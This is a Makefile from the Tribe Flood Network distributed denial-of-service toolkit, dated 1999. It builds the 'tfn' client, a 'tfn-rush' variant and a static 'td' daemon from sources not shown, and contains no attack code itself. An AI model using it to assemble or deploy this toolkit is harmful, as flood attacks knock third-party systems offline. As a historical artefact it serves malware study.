# Tribe Flood Network Makefile
# version 1.3 build 0053
# 1999 by Mixter - PRIVATE

CC=gcc
FLAGS=-O3 -Wall -fomit-frame-pointer -s

all: clean tfn td

clean:	
	@echo removing junk...
	@rm -f tfn tfn-rush td *.o syn udp icmp *~

tfn:	
	${CC} ${FLAGS} tribe.c -o tfn
	${CC} ${FLAGS} -DRUSH tribe.c -o tfn-rush

td:	
	${CC} ${FLAGS} td.c -static -o td

war:	
	@echo ...not love\!
